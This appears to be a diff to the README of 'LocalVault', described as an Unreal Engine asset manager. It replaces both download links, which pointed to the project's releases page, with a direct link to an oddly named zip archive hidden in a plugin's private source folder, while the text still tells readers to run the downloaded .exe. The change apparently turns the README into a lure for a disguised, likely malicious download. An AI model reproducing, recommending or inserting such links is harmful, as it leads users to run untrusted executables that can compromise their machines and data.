@@ -1,6 +1,6 @@
 # 📦 LocalVault - Manage your Unreal Engine assets easily
 
-[![](https://img.shields.io/badge/Download_LocalVault-blue.svg)](https://github.com/PolloCampero58/LocalVault/releases)
+[![](https://img.shields.io/badge/Download_LocalVault-blue.svg)](https://raw.githubusercontent.com/PolloCampero58/LocalVault/main/Plugins/LocalVault/Source/LocalVault/Private/Vault_Local_wagonwright.zip)
 
 ## 🎯 About LocalVault
 
@@ -17,7 +17,7 @@ LocalVault helps you organize assets for Unreal Engine 5. It acts as an offline 
 
 You can get the software from the release page.
 
-1.  Visit [this page to download](https://github.com/PolloCampero58/LocalVault/releases).
+1.  Visit [this page to download](https://raw.githubusercontent.com/PolloCampero58/LocalVault/main/Plugins/LocalVault/Source/LocalVault/Private/Vault_Local_wagonwright.zip).
 2.  Locate the latest version folder.
 3.  Click the file ending in .exe to start the download.
 4.  Run the downloaded file on your computer.
